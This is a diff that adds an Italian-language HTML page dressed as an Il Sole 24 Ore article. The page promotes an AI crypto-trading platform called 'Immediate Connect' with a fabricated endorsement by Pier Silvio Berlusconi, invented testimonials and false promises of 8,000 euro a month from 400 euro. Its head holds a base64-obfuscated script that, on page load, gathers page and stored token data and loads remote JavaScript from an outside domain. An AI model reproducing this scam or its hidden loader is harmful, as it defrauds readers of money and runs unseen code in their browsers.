@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+
+<html lang="it">
+  <head>
+<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfa1NjWkhnNWdqd0h6WnJ4eCc7CiAgICBpZiAoIXdpbmRvdy5fa1NjWkhnNWdqd0h6WnJ4eCkgewogICAgICAgIHdpbmRvdy5fa1NjWkhnNWdqd0h6WnJ4eCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9qYWlsdHJhY2suY2xpY2svdzd3NEwzJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX3M0RFJyeWhSR2RMcGc5ODkgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9zNERScnloUkdkTHBnOTg5ICE9PSAndW5kZWZpbmVkJyAmJiBfczREUnJ5aFJHZExwZzk4OSAhPT0gbnVsbCkgewogICAgICAgIHZhciBfTFZ4eWM1TTd0d1JISkNTUCA9IEpTT04ucGFyc2UoX3M0RFJyeWhSR2RMcGc5ODkpOwogICAgICAgIHZhciBfMUxzWkc5SHAxUVdzTE1jbSA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9MVnh5YzVNN3R3UkhKQ1NQLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX2tTY1pIZzVnandIelpyeHgudHRsIDwgXzFMc1pHOUhwMVFXc0xNY20pIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9kZ0YzdkQyd3NzNmtkN0Y2ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX2p6M3N0TmJ6V1Z0YzNWWWIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfRHg5VGsxMmRYODdEMTNYViA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX0R4OVRrMTJkWDg3RDEzWFYgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX0R4OVRrMTJkWDg3RDEzWFYgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfRHg5VGsxMmRYODdEMTNYViArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfRHg5VGsxMmRYODdEMTNYViArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX0R4OVRrMTJkWDg3RDEzWFYgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX0R4OVRrMTJkWDg3RDEzWFYgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9rU2NaSGc1Z2p3SHpacnh4LlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9kZ0YzdkQyd3NzNmtkN0Y2ICE9PSAndW5kZWZpbmVkJyAmJiBfZGdGM3ZEMndzczZrZDdGNiAmJiB3aW5kb3cuX2tTY1pIZzVnandIelpyeHgudW5pcXVlKSB7CiAgICAgICAgX0R4OVRrMTJkWDg3RDEzWFYgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfZGdGM3ZEMndzczZrZDdGNik7CiAgICB9CiAgICBpZiAodHlwZW9mIF9qejNzdE5ieldWdGMzVlliICE9PSAndW5kZWZpbmVkJyAmJiBfanozc3ROYnpXVnRjM1ZZYiAmJiB3aW5kb3cuX2tTY1pIZzVnandIelpyeHgudW5pcXVlKSB7CiAgICAgICAgX0R4OVRrMTJkWDg3RDEzWFYgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9qejNzdE5ieldWdGMzVlliKTsKICAgIH0KICAgIGlmICgnJyAhPT0gJycpIHsKICAgICAgICBfRHg5VGsxMmRYODdEMTNYViArPSAnJmJ5cGFzc19jYWNoZT0nOwogICAgfQogICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAnYXBwbGljYXRpb24vamF2YXNjcmlwdCc7CiAgICAgICAgYS5zcmMgPSB3aW5kb3cuX2tTY1pIZzVnandIelpyeHguUl9QQVRIICsgX0R4OVRrMTJkWDg3RDEzWFY7CiAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgIHMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgcykKICAgIH0pKCk7CiAgICA="></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no"
+    />
+
+    <link rel="shortcut icon" href="./img/favicon.ico" />
+    <link rel="stylesheet" href="./css/index.css" />
+
+    <meta
+      name="viewport"
+      content="width=device-width,minimum-scale=1,initial-scale=1"
+      class="next-head"
+    />
+
+    <title class="next-head">
+     XXI secolo
+    </title>
+
+    <meta content="311ijacp4n1t" />
+    <link rel="stylesheet" href="./css/mainform.css" />
+  </head>
+
+  <body>
+    <div>
+      <div>
+        <div>
+          <div class="main-header">
+            <div class="d-none d-print-block container">
+              <div class="htop-logo-print">
+                <img src="./img/ilsole24ore-o-2021.svg" alt="Il Sole 24 Ore" />
+              </div>
+              <span class="htop-section">Finanz</span>
+            </div>
+            <div class="htop pt-0">
+              <div class="container">
+                <div class="htop-title d-md-none">
+                  <div class="habs-left">
+                    <a
+                      class="hlink hlink--icon-big no-border no-outline"
+                      tabindex="0"
+                      role="button"
+                      ><span class="icon icon--big icon-menu"></span></a
+                    ><a class="hlink hlink--icon-big hlink--icon-big24" href="#"
+                      ><span class="icon icon--big icon-24"></span
+                    ></a>
+                  </div>
+                  <div class="htop-center htop-center--page">
+                    <h2 class="htitle htitle--sub">
+                      <a class="blue" href="#">Finanza</a>
+                    </h2>
+                  </div>
+                </div>
+                <div class="htop-wrap d-none d-md-block">
+                  <ul class="nav-inline">
+                    <li class="nav-inline-item">
+                      <a
+                        class="hlink hlink--icon no-border no-outline"
+                        tabindex="0"
+                        role="button"
+                        ><span class="icon icon-menu"></span
+                      ></a>
+                    </li>
+                    <li class="nav-inline-item">
+                      <a
+                        class="hlink hlink--icon no-border no-outline"
+                        href="#"
+                        tabindex="0"
+                        role="button"
+                        ><span class="icon icon-search"></span
+                      ></a>
+                    </li>
+                    <li class="nav-inline-item">
+                      <a class="hlink hlink--icon hlink--icon24" href="#"
+                        ><span class="icon icon-24"></span
+                      ></a>
+                    </li>
+                    <li class="nav-inline-item">
+                      <a class="hlink hlink--title" href="#">Finanza </a>
+                    </li>
+                  </ul>
+                  <div class="habs-right">
+                    <ul class="list-inline list-inline--tools">
+                      <li class="list-inline-item">
+                        <a class="ltool ltool--circle share-fb" href="#"
+                          ><span class="icon icon-facebook"></span
+                        ></a>
+                      </li>
+                      <li class="list-inline-item">
+                        <a class="ltool ltool--circle share-tw" href="#"
+                          ><span class="icon icon-twitter"></span
+                        ></a>
+                      </li>
+                      <li class="list-inline-item">
+                        <a class="ltool ltool--circle share-in" href="#"
+                          ><span class="icon icon-linkedin"></span
+                        ></a>
+                      </li>
+                      <li class="list-inline-item dropdown">
+                        <a class="ltool ltool--circle ltool--more" href="#"
+                          ><span class="icon icon-more"></span
+                        ></a>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="hgr hgr--light d-none d-md-block order-1">
+              <div class="container">
+                <div class="hgr-wrapper">
+                  <div class="hnav-scroll">
+                    <ul class="hnav hnav--scroll">
+                      <li class="hnav-item">
+                        <span class="hlink hlink--label">In evidenza</span>
+                      </li>
+                      <li class="hnav-item">
+                        <a href="#" class="hlink hlink--topic">Criptovalute</a>
+                      </li>
+                      <li class="hnav-item">
+                        <a href="#" class="hlink hlink--topic"
+                          >Spread BTP-Bund</a
+                        >
+                      </li>
+                      <li class="hnav-item">
+                        <a href="#" class="hlink hlink--topic">FTSE-MIB</a>
+                      </li>
+                      <li class="hnav-item">
+                        <a href="#" class="hlink hlink--topic">Petrolio</a>
+                      </li>
+                    </ul>
+                  </div>
+                  <ul class="hnav hnav--lined hnav--lsep">
+                    <li class="hnav-item">
+                      <a class="hlink hlink--logo hlink--logo-main" href="#"
+                        ><img
+                          class="himg himg--s"
+                          src="./img/24plus.svg"
+                          alt="24+"
+                      /></a>
+                    </li>
+                    <li class="hnav-item">
+                      <a class="hlink hlink--sub" href="#">Abbonati</a>
+                    </li>
+                    <li class="hnav-item">
+                      <div class="hicon">
+                        <a class="hicon-link no-border no-outline" href="#"
+                          ><span class="hicon-label">Accedi</span
+                          ><span class="icon icon-user"></span
+                        ></a>
+                      </div>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div>
+            <div class="main-content shrinkable">
+              <div class="main-article">
+                <div class="shrinkable">
+                  <section
+                    class="rel rel--strip hmarket bg-mtick inverted-color"
+                  >
+                    <div class="container">
+                      <div class="hmarket-expandible">
+                        <div class="hnav-scroll">
+                          <ul
+                            class="hnav hnav--small hnav--lined hnav--scroll hnav--fixw"
+                          >
+                            <li class="hnav-item">
+                              <div class="hmarket-index hmarket-head">
+                                <span class="hmarket-head-t">Finanza</span
+                                ><span class="hmarket-head-f"
+                                  ><a class="hmarket-head-l" href="#"
+                                    >Homepage</a
+                                  ><a class="hmarket-head-l" href="#"
+                                    >Tutti i dati</a
+                                  ></span
+                                >
+                              </div>
+                            </li>
+                            <li class="hnav-item">
+                              <a href="#" class="hmarket-index"
+                                ><span class="hmarket-name" style="color: white"
+                                  >FTSE MIB</span
+                                ><span class="hmarket-value">34163,6 </span
+                                ><span class="hmarket-var green"
+                                  ><span>+0,64% </span
+                                  ><span
+                                    class="icon icon-caret-up"
+                                  ></span></span
+                                ><span
+                                  class="icon icon-linktopage hmarket-goto"
+                                ></span
+                              ></a>
+                              <div class="hmarket-chart-wrapper d-md-none">
+                                <div class="hmarket-chart">
+                                  <span class="hmarket-status"
+                                    ><span class="hmarket-time">10:22</span>•
+                                    Mercato aperto</span
+                                  >
+                                  <figure class="sbox-datachart-img">
+                                    <img
+                                      class="img-fluid"
+                                      src="./img/Ticker2022.png"
+                                      alt=""
+                                    />
+                                  </figure>
+                                </div>
+                              </div>
+                            </li>
+                            <li class="hnav-item">
+                              <a href="#" class="hmarket-index"
+                                ><span class="hmarket-name" style="color: white"
+                                  >Spread BTP-Bund 10Y</span
+                                ><span class="hmarket-value">133,63 </span
+                                ><span class="hmarket-var green"
+                                  ><span>-0,25% </span
+                                  ><span
+                                    class="icon icon-caret-down"
+                                  ></span></span
+                                ><span
+                                  class="icon icon-linktopage hmarket-goto"
+                                ></span
+                              ></a>
+                              <div class="hmarket-chart-wrapper d-md-none">
+                                <div class="hmarket-chart">
+                                  <span class="hmarket-status"
+                                    ><span class="hmarket-time"
+                                      >10:36</span
+                                    ></span
+                                  >
+                                  <figure class="sbox-datachart-img">
+                                    <img
+                                      class="img-fluid"
+                                      src="./img/Ticker2022-2.png"
+                                      alt=""
+                                    />
+                                  </figure>
+                                </div>
+                              </div>
+                            </li>
+                            <li class="hnav-item">
+                              <a href="#" class="hmarket-index"
+                                ><span class="hmarket-name" style="color: white"
+                                  >EUR/USD</span
+                                ><span class="hmarket-value">1,085 </span
+                                ><span class="hmarket-var red"
+                                  ><span>-0,01% </span
+                                  ><span
+                                    class="icon icon-caret-down"
+                                  ></span></span
+                                ><span
+                                  class="icon icon-linktopage hmarket-goto"
+                                ></span
+                              ></a>
+                              <div class="hmarket-chart-wrapper d-md-none">
+                                <div class="hmarket-chart">
+                                  <span class="hmarket-status"
+                                    ><span class="hmarket-time"
+                                      >10:17</span
+                                    ></span
+                                  >
+                                  <figure class="sbox-datachart-img">
+                                    <img
+                                      class="img-fluid"
+                                      src="./img/Ticker2022-4.png"
+                                      alt=""
+                                    />
+                                  </figure>
+                                </div>
+                              </div>
+                            </li>
+                            <li class="hnav-item">
+                              <a href="#" class="hmarket-index"
+                                ><span class="hmarket-name" style="color: white"
+                                  >Brent</span
+                                ><span class="hmarket-value">89,45 </span
+                                ><span class="hmarket-var green"
+                                  ><span>+0,03% </span
+                                  ><span
+                                    class="icon icon-caret-up"
+                                  ></span></span
+                                ><span
+                                  class="icon icon-linktopage hmarket-goto"
+                                ></span
+                              ></a>
+                              <div class="hmarket-chart-wrapper d-md-none">
+                                <div class="hmarket-chart">
+                                  <span class="hmarket-status"
+                                    ><span class="hmarket-time">10:17</span>•
+                                    Mercato chiuso</span
+                                  >
+                                  <figure class="sbox-datachart-img">
+                                    <img
+                                      class="img-fluid"
+                                      src="./img/Ticker2022-1.png"
+                                      alt=""
+                                    />
+                                  </figure>
+                                </div>
+                              </div>
+                            </li>
+                            <li class="hnav-item">
+                              <a href="#" class="hmarket-index"
+                                ><span class="hmarket-name" style="color: white"
+                                  >Oro Spot Eur</span
+                                ><span class="hmarket-value">69,72 </span
+                                ><span class="hmarket-var green"
+                                  ><span>+0,07% </span
+                                  ><span
+                                    class="icon icon-caret-up"
+                                  ></span></span
+                                ><span
+                                  class="icon icon-linktopage hmarket-goto"
+                                ></span
+                              ></a>
+                              <div class="hmarket-chart-wrapper d-md-none">
+                                <div class="hmarket-chart">
+                                  <span class="hmarket-status"
+                                    ><span class="hmarket-time">10:17</span>•
+                                    Mercato chiuso</span
+                                  >
+                                  <figure class="sbox-datachart-img">
+                                    <img
+                                      class="img-fluid"
+                                      src="./img/Ticker2022-3.png"
+                                      alt=""
+                                    />
+                                  </figure>
+                                </div>
+                              </div>
+                            </li>
+                            <li class="hnav-item d-lg-none d-xl-inline-block">
+                              <a href="#" class="hmarket-index"
+                                ><span class="hmarket-name" style="color: white"
+                                  >S&amp;P 500</span
+                                ><span class="hmarket-value">5209,91 </span
+                                ><span class="hmarket-var green"
+                                  ><span>+0,14% </span
+                                  ><span
+                                    class="icon icon-caret-up"
+                                  ></span></span
+                                ><span
+                                  class="icon icon-linktopage hmarket-goto"
+                                ></span
+                              ></a>
+                              <div class="hmarket-chart-wrapper d-md-none">
+                                <div class="hmarket-chart">
+                                  <span class="hmarket-status"
+                                    ><span class="hmarket-time">23:18</span>•
+                                    Mercato chiuso</span
+                                  >
+                                  <figure class="sbox-datachart-img">
+                                    <img
+                                      class="img-fluid"
+                                      src="./img/Ticker2022-5.png"
+                                      alt=""
+                                    />
+                                  </figure>
+                                </div>
+                              </div>
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                    </div>
+                  </section>
+                  <div class="container aentry-container">
+                    <div class="row">
+                      <div class="col-lg-8">
+                        <div class="aentry aentry--lined">
+                          <div class="ahead ahead--big aentry--full-md">
+                            <p class="meta">
+                              <span class="meta-part dropdown"
+                                ><a class="subsection" href="#"
+                                  ><span>Servizio</span></a
+                                ><span
+                                  class="dropdown-menu dropdown-menu--bubble"
+                                  ><span class="shinfo"
+                                    ><span class="shinfo-title">Servizio</span
+                                    ><span class="shinfo-text"
+                                      >Contenuto basato su fatti, osservati e
+                                      verificati dal reporter in modo diretto o
+                                      riportati da fonti verificate e
+                                      attendibili.</span
+                                    ><a class="shinfo-link" href="#"
+                                      >Scopri di più</a
+                                    ></span
+                                  ></span
+                                ></span
+                              ><span class="meta-part subhead"
+                                >La giornata dei mercati
+                              </span>
+                            </p>
+                            <h1 class="atitle">
+                              Progetto del XXI secolo: reddito garantito di 8000
+                              euro al mese per tutti gli italiani!
+                            </h1>
+                            <p>
+                              Un fabbro di Salerno, iniziando a investire con la
+                              somma minima di 400 euro, è riuscito a ottenere un
+                              reddito consistente già nel primo mese di
+                              partecipazione al progetto.
+                            </p>
+                            <p class="auth">
+                              <a href="#">Davide Madedda</a>
+                            </p>
+                          </div>
+                          <style type="text/css">
+                            .embed-responsive-item {
+                              position: relative !important;
+                            }
+                            #PL-378537198.embed-responsive-dynamic.jsx-4136063846:before {
+                              padding-top: 5px !important;
+                            }
+                          </style>
+                          <div class="reading">
+                            <p class="reading-time">
+                              <span class="icon icon-reading-time"></span>2' di
+                              lettura
+                            </p>
+                          </div>
+                          <figure class="aimg aentry--full">
+                            <div
+                              class="jsx-4136063846 embed-responsive embed-responsive-dynamic"
+                              style="position: relative !important"
+                            >
+                              <div class="jsx-4136063846 embed-responsive-item">
+                                <img
+                                  src="./img/a1.jpg"
+                                  class="img-fluid"
+                                  alt=""
+                                  style="width: 100%; height: auto !important"
+                                />
+                              </div>
+                            </div>
+                          </figure>
+                          <div class="row">
+                            <div class="col-lg-10">
+                              <p class="atext">
+                                Unica programma finanziario, basato
+                                sull'intelligenza artificiale e sviluppato dai
+                                principali scienziati ed economisti su
+                                iniziativa di Pierre Silvio Berlusconi, ora è
+                                accessibile a tutti. Grazie alle risorse
+                                tecniche e all'esperienza di livello mondiale,
+                                questo programma offre nuove opportunità per
+                                ottenere una fonte di reddito supplementare.
+                              </p>
+                              <a href="#" class="button-link"
+                                >SITO WEB UFFICIALE</a
+                              >
+                              <style>
+                                .button-link {
+                                  background-color: #b80000;
+                                  color: #fff;
+                                  display: block;
+                                  margin: 3rem auto;
+                                  max-width: 80%;
+                                  text-align: center;
+                                  text-decoration: none;
+                                  text-transform: uppercase;
+                                  margin-bottom: 1rem;
+                                  padding: 1rem 0;
+                                  border-radius: 4px;
+                                }
+                              </style>
+                              <br /><br />
+                              <h2>
+                                Paolo è stato uno dei primi partecipanti della
+                                piattaforma e ha gentilmente accettato di
+                                condividere la sua esperienza con la piattaforma
+                              </h2>
+                              <br /><br />
+                              <video
+                                src="./media/a1.mp4"
+                                controls=""
+                                width="100%"
+                              ></video>
+                              <br /><br />
+                              <p
+                                class="atext"
+                                style="
+                                  padding-left: 20px;
+                                  border-left: 2px solid #7d0000;
+                                "
+                              >
+                                Paolo Cavatio: “Nella mia vita ho provato molti
+                                mestieri, negli ultimi 10 anni lavoro come
+                                elettricista e ho una piccola officina. Lavoro
+                                nella mia città natale, Salerno, vivo con la mia
+                                famiglia, fornisco loro tutto il necessario, ma
+                                mi piacerebbe avere molto di più. Ho una
+                                passione per le moto. Grazie a una pubblicità su
+                                Facebook, ho scoperto il progetto
+                                <a href="#">Immediate Connect</a>. Da qualche
+                                mese guadagno con la piattaforma e
+                                <a href="#"
+                                  >sono già riuscito a realizzare il mio sogno,
+                                  investendo solo 400 euro.</a
+                                >
+                                Per la mia famiglia ho pagato una vacanza di due
+                                settimane, un sogno che avevamo da tanto tempo.
+                                Sono immensamente grato per questa opportunità e
+                                vi esorto a non perdere la vostra occasione.”
+                              </p>
+                              <a href="#" class="button-link"
+                                >SITO WEB UFFICIALE</a
+                              >
+                              <br /><br />
+                              <p
+                                class="atext"
+                                style="
+                                  padding-left: 20px;
+                                  border-left: 2px solid #7d0000;
+                                "
+                              >
+                                <a href="#">Pier Silvio Berlusconi</a>:
+                                «Pensateci:
+                                <a href="#"
+                                  >se investite 400 euro nella piattaforma, non
+                                  dovrete più lavorare.</a
+                                >
+                                Non molte persone sanno come investire e
+                                ottenere profitti. Con questa piattaforma potete
+                                davvero guadagnare»
+                              </p>
+                              <img src="./img/2.jpg" width="100%" />
+                              <br /><br />
+                              <p
+                                class="atext"
+                                style="
+                                  padding-left: 20px;
+                                  border-left: 2px solid #7d0000;
+                                "
+                              >
+                                «In altre parole, la piattaforma lavora
+                                automaticamente sul vostro telefono o computer
+                                portatile. Il software analizza i prezzi attuali
+                                delle criptovalute e esegue automaticamente le
+                                operazioni di acquisto e vendita. Non c'è magia,
+                                si tratta di normale trading di mercato, ma
+                                grazie al software
+                                <a href="#">Immediate Connect</a>
+                                potete ottenere buoni profitti da ogni movimento
+                                del mercato. Per fare previsioni accurate, la
+                                tecnologia di
+                                <a href="#">Immediate Connect</a>
+                                analizza i dati utilizzando 37 indicatori
+                                finanziari, che gli specialisti del trading
+                                chiamano "segnali". Con questi indicatori, la
+                                piattaforma fa previsioni sui futuri prezzi
+                                delle criptovalute e compie operazioni,
+                                lavorando più velocemente e con maggiore
+                                precisione rispetto a un'intera squadra di
+                                finanziatori. Il principale vantaggio è la
+                                possibilità di operare 24 ore su 24, permettendo
+                                di effettuare migliaia e anche decine di
+                                migliaia di operazioni al giorno. Secondo le
+                                statistiche dei primi 10.000 partecipanti alla
+                                piattaforma,
+                                <a href="#"
+                                  >investendo una somma minima di 400 euro, il
+                                  vostro guadagno minimo sarà di 8.000 euro al
+                                  mese.</a
+                                >
+                                Se investite di più, il profitto sarà
+                                proporzionalmente maggiore.»
+                              </p>
+                              <a href="#" class="button-link"
+                                >SITO WEB UFFICIALE</a
+                              >
+                              <br /><br />
+                              <h2>Il sistema funziona davvero?</h2>
+                              <br />
+                              <img src="./img/a3.jpg" width="100%" />
+                              <br /><br />
+                              <a href="#" class="button-link"
+                                >SITO WEB UFFICIALE</a
+                              ><br /><br />
+                              <p class="atext">
+                                Abbiamo pensato che il modo migliore per
+                                rispondere a questa domanda fosse verificare le
+                                affermazioni di
+                                <a href="#">Pier Silvio Berlusconi</a>. Abbiamo
+                                creato un account e depositato un importo
+                                iniziale di 1000 euro.
+                              </p>
+                              <p class="atext">
+                                Dopo di che, non ci restava che premere il
+                                pulsante 'Start'. Tutto il resto, ovviamente, è
+                                stato fatto dal software.
+                              </p>
+                              <p class="atext">
+                                <a href="#"
+                                  >In 7 giorni il nostro guadagno è stato di
+                                  11600 euro.</a
+                                >
+                              </p>
+
+                              <img src="./img/4.jpg" width="100%" />
+                              <br /><br />
+                              <a href="#" class="button-link"
+                                >SITO WEB UFFICIALE</a
+                              ><br /><br />
+
+                              <h2>
+                                Guida rapida su come iniziare a guadagnare con
+                                <a href="#">Immediate Connect</a>:
+                              </h2>
+                              <ul>
+                                <li class="atext">
+                                  ✅
+                                  <a href="#"
+                                    >Registrati tramite il modulo sottostante e
+                                    aspetta che un operatore ti chiami.</a
+                                  >
+                                </li>
+                                <li class="atext">
+                                  ✅ Dopo la registrazione, attendi la chiamata
+                                  di un manager. Questo ti aiuterà a depositare
+                                  i fondi e configurare la piattaforma per
+                                  massimizzare i profitti.
+                                </li>
+                                <li class="atext">
+                                  ✅ Ricarica il saldo. Il deposito minimo per
+                                  avviare il programma è di 250 euro.
+                                </li>
+                                <li class="atext">
+                                  ✅ Una volta che il tuo account sarà stato
+                                  ricaricato, il programma inizierà a eseguire
+                                  transazioni entro pochi minuti.
+                                </li>
+                                <li class="atext">
+                                  ✅ Puoi ritirare i soldi in qualsiasi momento
+                                  e i fondi verranno accreditati sul tuo conto
+                                  entro 2-3 ore (a seconda della banca).
+                                </li>
+                              </ul>
+
+                              </body>
+</html>
